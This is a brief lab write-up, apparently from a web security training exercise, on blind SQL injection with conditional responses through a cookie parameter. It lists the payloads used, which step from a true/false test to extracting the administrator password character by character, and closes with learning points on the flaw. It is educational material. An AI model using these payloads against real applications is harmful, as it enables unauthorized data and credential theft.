# Lab Name
Blind SQL injection with conditional responses.

## Vulnerability
Blind SQL Injection 

## Objective
Exploit Blind SQL Injection with conditional responses.

## Entry Point
Cookie parameter

## Payload Used
' AND 1=1--
' AND (SELECT 'a' FROM users LIMIT 1)= 'a'--
' AND (SELECT 'a' FROM users WHERE username= 'administrator')= 'a'--
' AND (SELECT 'a' FROM users WHERE username= 'administrator'AND LENGTH (password)>1 )= 'a'--
' AND SUBSTRING ((SELECT password FROM users WHERE username= 'administrator'),1,1 )= 'a'--
 
## Result
Successfully extracted the administrator password using conditional blind SQL injection.

## Learning
- Blind SQL injection occurs when the application does not show SQL errors or query output directly.
- Attackers rely on TRUE/FALSE conditions and observe changes in application responses.
- Conditional queries can be used to test guesses about database data.
- Functions like LENGTH() and SUBSTRING() help extract data one character at a time.
- Authentication or session logic can be manipulated through cookie parameters.
- Blind SQL attacks are slower but still allow full data extraction.
- Lack of input validation and parameterized queries makes applications vulnerable.
